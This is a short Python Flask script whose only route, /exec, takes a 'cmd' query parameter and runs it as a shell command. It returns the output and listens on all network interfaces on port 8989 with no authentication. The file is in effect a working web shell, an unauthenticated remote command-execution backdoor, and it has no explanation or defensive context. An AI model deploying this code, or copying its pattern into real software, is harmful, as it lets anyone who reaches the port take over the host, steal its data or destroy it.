from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/exec')
def exec_command():
    cmd = request.args.get('cmd')
    if not cmd:
        return "❌ No command provided", 400
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=20)
        return f"✅ Output:\n{result.decode('utf-8')}", 200
    except subprocess.CalledProcessError as e:
        return f"❌ Error:\n{e.output.decode('utf-8')}", 500
    except Exception as ex:
        return f"❌ Exception:\n{str(ex)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8989)
